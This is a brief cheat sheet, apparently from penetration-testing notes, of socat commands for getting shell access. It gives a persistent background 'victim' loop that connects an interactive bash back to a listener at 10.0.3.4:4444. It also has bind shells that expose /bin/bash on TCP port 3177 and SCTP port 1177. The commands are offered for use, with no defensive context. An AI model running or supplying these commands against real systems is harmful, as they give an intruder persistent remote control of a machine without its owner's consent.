# Socat

## Reverse socat loop

Listener:
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Victim:
```
while true; do sleep 10; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444; done &
```

## Bind shell

Listener:
```
socat TCP4-Listen:3177,fork EXEC:/bin/bash &
```

Connect:
```
socat STDIO TCP4:IP:3177
```

## SCTP

Listener:
```
socat SCTP-Listen:1177,fork EXEC:/bin/bash &
```

Connect:
```
socat STDIO SCTP:IP:1177
```
